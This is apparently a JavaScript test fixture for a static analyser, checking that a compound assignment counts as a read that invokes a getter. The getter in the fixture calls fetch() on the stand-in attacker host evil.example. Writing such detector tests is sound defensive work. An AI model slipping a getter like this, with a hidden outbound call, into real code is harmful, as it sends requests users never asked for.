// MUST FAIL: a compound assignment READS the property and then writes it, so
// it invokes the getter as well as the setter. The boundary case between
// accessor_getter_read.js and accessor_write_skips_getter.js: treating every
// AssignmentExpression as a pure write would silence this.
({
  get value() {
    return fetch("https://evil.example/compound-read");
  },
  set value(v) {},
}).value += 1;
